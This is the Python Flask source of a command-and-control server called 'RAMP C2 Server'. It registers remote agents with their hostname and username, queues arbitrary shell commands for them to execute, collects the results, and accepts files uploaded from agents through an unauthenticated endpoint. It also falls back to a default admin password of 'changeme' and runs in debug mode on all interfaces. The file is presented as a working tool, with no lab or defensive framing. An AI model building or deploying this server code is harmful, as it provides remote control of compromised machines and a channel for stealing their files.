"""
RAMP C2 Server
Main Flask application with REST API for agent communication
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
import logging
from datetime import datetime
import os
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

from auth import token_required, generate_token, verify_token
from database import Database
from tasks import TaskQueue

# Initialize Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', os.urandom(32).hex())
CORS(app)

# Initialize components
db = Database()
task_queue = TaskQueue()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


# ============================================================================
# Agent API Endpoints
# ============================================================================

@app.route('/api/agent/checkin', methods=['POST'])
def agent_checkin():
    """Agent initial check-in"""
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        
        if not agent_id:
            return jsonify({'error': 'Missing agent_id'}), 400
        
        # Register or update agent
        agent_data = {
            'agent_id': agent_id,
            'hostname': data.get('data', {}).get('hostname'),
            'username': data.get('data', {}).get('username'),
            'platform': data.get('data', {}).get('platform'),
            'version': data.get('data', {}).get('version'),
            'last_seen': datetime.now().isoformat(),
            'ip_address': request.remote_addr
        }
        
        db.register_agent(agent_data)
        logger.info(f"Agent checked in: {agent_id} from {request.remote_addr}")
        
        return jsonify({
            'type': 'ack',
            'timestamp': int(datetime.now().timestamp()),
            'data': {'status': 'registered'}
        })
    
    except Exception as e:
        logger.error(f"Checkin error: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/agent/tasks', methods=['POST'])
def get_agent_tasks():
    """Get pending tasks for agent"""
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        
        if not agent_id:
            return jsonify({'error': 'Missing agent_id'}), 400
        
        # Update last seen
        db.update_agent_heartbeat(agent_id)
        
        # Get pending tasks
        tasks = task_queue.get_tasks(agent_id)
        
        return jsonify({
            'type': 'tasks',
            'timestamp': int(datetime.now().timestamp()),
            'data': {'tasks': tasks}
        })
    
    except Exception as e:
        logger.error(f"Task retrieval error: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/agent/result', methods=['POST'])
def receive_result():
    """Receive task result from agent"""
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        result_data = data.get('data')
        
        if not agent_id or not result_data:
            return jsonify({'error': 'Invalid data'}), 400
        
        # Store result
        db.store_result(agent_id, result_data)
        logger.info(f"Received result from agent: {agent_id}")
        
        return jsonify({
            'type': 'ack',
            'timestamp': int(datetime.now().timestamp())
        })
    
    except Exception as e:
        logger.error(f"Result storage error: {e}")
        return jsonify({'error': str(e)}), 500


# ============================================================================
# Controller API Endpoints (Protected)
# ============================================================================

@app.route('/api/auth/login', methods=['POST'])
def login():
    """Authenticate controller and get JWT token"""
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        
        # TODO: Implement proper user authentication
        if username == 'admin' and password == os.environ.get('ADMIN_PASSWORD', 'changeme'):
            token = generate_token(username)
            return jsonify({'token': token})
        
        return jsonify({'error': 'Invalid credentials'}), 401
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/agents', methods=['GET'])
@token_required
def list_agents():
    """List all connected agents"""
    try:
        agents = db.get_all_agents()
        return jsonify({'agents': agents})
    
    except Exception as e:
        logger.error(f"Agent list error: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/agents/<agent_id>/command', methods=['POST'])
@token_required
def send_command(agent_id):
    """Send command to specific agent"""
    try:
        data = request.get_json()
        command = data.get('command')
        
        if not command:
            return jsonify({'error': 'Missing command'}), 400
        
        # Queue task for agent
        task_id = task_queue.add_task(agent_id, {
            'type': 'execute',
            'data': {'command': command}
        })
        
        logger.info(f"Command queued for agent {agent_id}: {command}")
        
        return jsonify({
            'task_id': task_id,
            'status': 'queued'
        })
    
    except Exception as e:
        logger.error(f"Command error: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/agents/<agent_id>/results', methods=['GET'])
@token_required
def get_agent_results(agent_id):
    """Get recent task results for an agent"""
    try:
        results = db.get_agent_results(agent_id, limit=50)
        return jsonify({'results': results})
    
    except Exception as e:
        logger.error(f"Results retrieval error: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/files/upload', methods=['POST'])
def upload_file():
    """Receive file upload from agent"""
    try:
        remote_path = request.args.get('path')
        file_data = request.get_data()
        
        # Store file securely
        upload_dir = 'uploads'
        os.makedirs(upload_dir, exist_ok=True)
        
        file_path = os.path.join(upload_dir, os.path.basename(remote_path))
        with open(file_path, 'wb') as f:
            f.write(file_data)
        
        logger.info(f"File uploaded: {remote_path}")
        return jsonify({'status': 'success'})
    
    except Exception as e:
        logger.error(f"Upload error: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/files/download', methods=['GET'])
def download_file():
    """Send file to agent"""
    try:
        remote_path = request.args.get('path')
        
        # TODO: Implement secure file serving
        return jsonify({'error': 'Not implemented'}), 501
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500


# ============================================================================
# Health Check
# ============================================================================

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat()
    })


# ============================================================================
# Main Entry Point
# ============================================================================

if __name__ == '__main__':
    # Check for SSL certificates
    cert_file = 'certs/server.crt'
    key_file = 'certs/server.key'
    
    if os.path.exists(cert_file) and os.path.exists(key_file):
        # Run with HTTPS
        logger.info("Starting RAMP C2 Server with HTTPS...")
        app.run(
            host='0.0.0.0',
            port=8443,
            ssl_context=(cert_file, key_file),
            debug=False
        )
    else:
        logger.warning("SSL certificates not found! Running without HTTPS (not recommended)")
        logger.warning(f"Generate certificates using: python ../tools/ssl_gen.py")
        app.run(
            host='0.0.0.0',
            port=8080,
            debug=True
        )
